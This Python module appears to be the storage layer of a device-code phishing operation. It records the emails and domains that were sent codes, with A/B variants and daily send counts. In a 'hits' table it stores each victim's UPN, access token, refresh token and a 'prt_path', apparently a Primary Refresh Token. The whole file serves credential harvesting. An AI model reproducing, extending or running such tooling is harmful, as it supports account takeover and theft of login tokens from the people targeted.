"""SQLite helpers for the device-code pipeline. Import has no side effects."""

import os
import sqlite3
from contextlib import contextmanager

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hits.db")

SCHEMA = """
CREATE TABLE IF NOT EXISTS sent (
    domain     TEXT NOT NULL,
    email      TEXT NOT NULL,
    code       TEXT NOT NULL,
    issued_at  INTEGER NOT NULL,
    variant    TEXT NOT NULL DEFAULT 'a'
);
CREATE INDEX IF NOT EXISTS idx_sent_email ON sent(email);
CREATE TABLE IF NOT EXISTS hits (
    domain         TEXT,
    email          TEXT,
    upn            TEXT,
    access_token   TEXT,
    refresh_token  TEXT,
    prt_path       TEXT,
    subjects       TEXT,
    obtained_at    INTEGER,
    consumer       INTEGER NOT NULL DEFAULT 0
);
CREATE TABLE IF NOT EXISTS fails (
    domain  TEXT,
    email   TEXT,
    stage   TEXT,
    reason  TEXT,
    ts      INTEGER
);
"""


def _connect():
    conn = sqlite3.connect(DB_PATH, timeout=30)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=30000")
    return conn


def init_db():
    conn = _connect()
    try:
        conn.executescript(SCHEMA)
        cols = {r["name"] for r in conn.execute("PRAGMA table_info(sent)")}
        if "variant" not in cols:
            conn.execute("ALTER TABLE sent ADD COLUMN variant TEXT NOT NULL DEFAULT 'a'")
        hcols = {r["name"] for r in conn.execute("PRAGMA table_info(hits)")}
        if "consumer" not in hcols:
            conn.execute("ALTER TABLE hits ADD COLUMN consumer INTEGER NOT NULL DEFAULT 0")
        conn.commit()
    finally:
        conn.close()


@contextmanager
def _cursor():
    conn = _connect()
    try:
        yield conn
        conn.commit()
    finally:
        conn.close()


def add_sent(domain, email, code, variant="a"):
    import time

    with _cursor() as c:
        c.execute(
            "INSERT INTO sent(domain,email,code,issued_at,variant) VALUES (?,?,?,?,?)",
            (domain, email, code, int(time.time()), variant),
        )


def is_sent(email):
    with _cursor() as c:
        row = c.execute("SELECT 1 FROM sent WHERE email=? LIMIT 1", (email,)).fetchone()
    return row is not None


def sent_today():
    import time

    start = int(time.time()) - (int(time.time()) % 86400)
    with _cursor() as c:
        row = c.execute("SELECT COUNT(*) AS n FROM sent WHERE issued_at>=?", (start,)).fetchone()
    return row["n"]


def add_hit(domain, email, upn, access_token, refresh_token, prt_path, subjects, consumer=0):
    import time

    with _cursor() as c:
        c.execute(
            "INSERT INTO hits(domain,email,upn,access_token,refresh_token,prt_path,subjects,obtained_at,consumer) "
            "VALUES (?,?,?,?,?,?,?,?,?)",
            (domain, email, upn, access_token, refresh_token, prt_path,
             subjects, int(time.time()), int(consumer)),
        )


def add_fail(email, stage, reason, domain=""):
    import time

    with _cursor() as c:
        c.execute(
            "INSERT INTO fails(domain,email,stage,reason,ts) VALUES (?,?,?,?,?)",
            (domain, email, stage, str(reason)[:2000], int(time.time())),
        )


def counts():
    with _cursor() as c:
        sent = c.execute("SELECT COUNT(*) AS n FROM sent").fetchone()["n"]
        hits = c.execute("SELECT COUNT(*) AS n FROM hits").fetchone()["n"]
        fails = c.execute("SELECT COUNT(*) AS n FROM fails").fetchone()["n"]
    return {"sent": sent, "hits": hits, "fails": fails}


def recent_hits(limit=200):
    with _cursor() as c:
        rows = c.execute(
            "SELECT * FROM hits ORDER BY obtained_at DESC LIMIT ?", (limit,)
        ).fetchall()
    return [dict(r) for r in rows]
